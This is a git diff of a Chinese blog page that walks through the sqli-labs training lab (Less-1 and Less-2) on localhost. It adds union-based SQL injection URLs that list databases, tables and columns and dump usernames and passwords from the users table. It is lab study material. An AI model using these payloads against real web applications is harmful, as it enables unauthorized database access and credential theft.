@@ -465,7 +465,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.7k
+                    1.8k
                 </div>
                 
 
@@ -505,9 +505,19 @@
 注意这里id是-1</code></pre><p>当把id改成-1后,这时页面显示的结果如下,原因在于主表的数据查不到然后联合的那个数据(100，2，3),如果id合法的话2和3不会显示出来<br><a href="https://imgchr.com/i/DMmJk4" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMmJk4.png" alt=""></a><br>结论:经过分析可知,三列里,只有第二第三个参数能回显,第一个应该是没什么用的</p>
 <p>为了更直观的感受上面的注入和数据库中表的关系,可以看一下下面sql语句执行的实际效果<br><a href="https://imgchr.com/i/DMmTAg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMmTAg.png" alt=""></a><br><strong><em>显然,如果id=1的话,新添的数据被加在了联合表的后面,并且第一个参数是id,确实不会正确回显,第二第三个参数是username和password</em></strong></p>
 <hr>
-<h4 id="进行敏感操作"><a href="#进行敏感操作" class="headerlink" title="进行敏感操作"></a>进行敏感操作</h4><p>当我们对数据回显位置有了了解之后,就可以在联合查询语句中进行查询敏感信息了<br>1.比如得到所有数据库的名字<br>注:因为知道了参数对应的回显位置,所以下面让password的位置回显数据</p>
+<h4 id="进行敏感操作-1-4关都这样-主要在第一关详细讲"><a href="#进行敏感操作-1-4关都这样-主要在第一关详细讲" class="headerlink" title="进行敏感操作(1-4关都这样,主要在第一关详细讲)"></a>进行敏感操作(1-4关都这样,主要在第一关详细讲)</h4><p>当我们对数据回显位置有了了解之后,就可以在联合查询语句中进行查询敏感信息了<br>1.比如得到所有数据库的名字<br>注1:因为知道了参数对应的回显位置,所以下面让password的位置回显数据<br>注2:利用group_concat(字段名)来吧需要的字段的数据聚合到一个组然后输出</p>
 <pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1' 
-union select 1,2,GROUP_CONCAT(schema_name)FROM information_schema.schemata--+</code></pre><p><a href="https://imgchr.com/i/DMGl8O" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMGl8O.png" alt=""></a></p>
+union select 1,2,GROUP_CONCAT(schema_name)FROM information_schema.schemata--+</code></pre><p><a href="https://imgchr.com/i/DMGl8O" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMGl8O.png" alt="结果图"></a></p>
+<p>2.爆security数据库的数据表</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" --+</code></pre><p><a href="https://imgchr.com/i/DQJ8C6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQJ8C6.png" alt="结果图"></a></p>
+<p>3.爆users表的列</p>
+<pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1'union select 1,2,group_concat() from information_schema.columns where table_name="users" --+</code></pre><p><a href="https://imgchr.com/i/DQYfyD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQYfyD.png" alt="结果图"></a></p>
+<p>4.爆数据</p>
+<pre><code>把id=2的username和password找出来
+http://127.0.0.1/sqli-labs/Less-1/?id=-1'union select 1,username,password from users where id=2 --+</code></pre><p>对应的sql语句是</p>
+<pre class=" language-SQL"><code class="language-SQL">SELECT*FROM users WHERE id='-1' UNION SELECT 1,username,PASSWORD FROM users WHERE id=2 </code></pre>
+<p><a href="https://imgchr.com/i/DQr9AS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQr9AS.png" alt="结果图"></a></p>
+<p>在sqlyog中的展示:<br><a href="https://imgchr.com/i/DQDI0K" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQDI0K.png" alt=""></a></p>
 <hr>
 <h2 id="二-less2-——-整型注入"><a href="#二-less2-——-整型注入" class="headerlink" title="二.less2 —— 整型注入"></a>二.less2 —— 整型注入</h2><p><strong><em>less2和less1的步骤差不多,下面省略不写了,只写主要部分</em></strong><br>分析:<br>当id等于1的时候可以正常回显</p>
 <pre><code>http://127.0.0.1/sqli-labs/Less-2/?id=1</code></pre><h3 id="1-首先判断注入类型"><a href="#1-首先判断注入类型" class="headerlink" title="1.首先判断注入类型"></a>1.首先判断注入类型</h3><p>报错内容(<strong><em>这里的报错和less1中的是不一样的</em></strong>)： </p>
@@ -728,11 +738,12 @@ SELECT * FROM `users` WHERE id=("1");#双引号加括号</code></pre><p>步骤�
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            主要记录我在学mysql时忘掉的或没注意到的知识
-
-        document.querySelectorAll('.github-emoji')
-          .forEach(el => {
-            if (
+                            主要记录mysql注入天书中Background中的知识
+一.Background-1基础知识mysql里的一些函数:
+show databases;
+use security;
+show tables；
+desc emails；#查看表结
                         
                     </div>
                     <div class="publish-info">
